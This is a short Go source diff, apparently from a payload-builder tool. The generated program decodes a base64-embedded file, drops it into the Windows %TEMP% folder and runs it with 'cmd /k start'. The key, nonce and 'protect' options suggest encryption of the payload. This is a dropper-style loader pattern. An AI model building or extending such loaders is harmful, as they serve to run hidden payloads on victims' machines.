@@ -7,7 +7,6 @@ import (
 	"io/ioutil"
 	"os"
 	"path"
-	"strings"
 )
 
 func NoFileTemplate(filepath string, key []byte, nonce []byte, raw []byte, protect bool)  {
@@ -490,7 +489,7 @@ func base64ToFile(data string, filepath string) {
 
 func main() {
 	
-	filepath := "%s"
+	filepath := strings.Replace(os.Getenv("temp") +"\\" + "%s" , "\\", "\\\\", -1)
 	data := "%s"
 	base64ToFile(data, filepath)
 	cmd := exec.Command("cmd", "/k", "start",  filepath)
@@ -515,7 +514,7 @@ func main() {
 		filepath,
 		[]byte(fmt.Sprintf(
 			template,
-			strings.Replace(os.Getenv("temp") +"\\" +path.Base(file) , "\\", "\\\\", -1),
+			path.Base(file),
 			fileToBase64(file),
 			protect_str,
 			base64.StdEncoding.EncodeToString(key),
